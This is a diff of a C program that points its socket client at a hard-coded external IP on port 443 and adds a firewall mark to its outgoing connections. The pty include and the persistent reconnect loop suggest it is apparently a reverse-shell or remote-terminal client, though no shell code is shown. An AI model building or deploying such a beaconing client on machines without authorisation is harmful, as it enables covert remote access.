@@ -1,15 +1,10 @@
-#define BS_SERVER_IP "127.0.0.1"
-#define BS_SERVER_PORT 443
-
-#define BS_CONN_LENGTH 10
-
-
 #include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <pty.h>
 #include <sys/socket.h>
+#include <linux/types.h>
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <stdint.h>
@@ -17,6 +12,12 @@
 #define STB_DS_IMPLEMENTATION
 #include "stb_ds.h"
 #include <pthread.h>
+
+#define BS_SERVER_IP "185.231.247.18"
+uint32_t BS_MARK = 69;
+#define BS_SERVER_PORT 443
+
+#define BS_CONN_LENGTH 100
 
 #define MIN(a, b) ((a) < (b) ? (a) : (b))
 
@@ -42,6 +43,10 @@ void bs_reconnect(){
     while(!connected){
         if ((bs_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
             perror("Ошибка создания сокета");
+            exit(1);
+        }
+        if (setsockopt(bs_fd, SOL_SOCKET, 36, &BS_MARK, sizeof(BS_MARK))){
+            perror("Failed to set fwmark");
             exit(1);
         }
         if (connect(bs_fd, (struct sockaddr *)&bs_server_addr, sizeof(bs_server_addr)) < 0) {
@@ -140,6 +145,11 @@ int main() {
 
     if ((bs_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         perror("Ошибка создания сокета");
+        exit(1);
+    }
+
+    if (setsockopt(bs_fd, SOL_SOCKET, 36, &BS_MARK, sizeof(BS_MARK))){
+        perror("Failed to set fwmark");
         exit(1);
     }
 
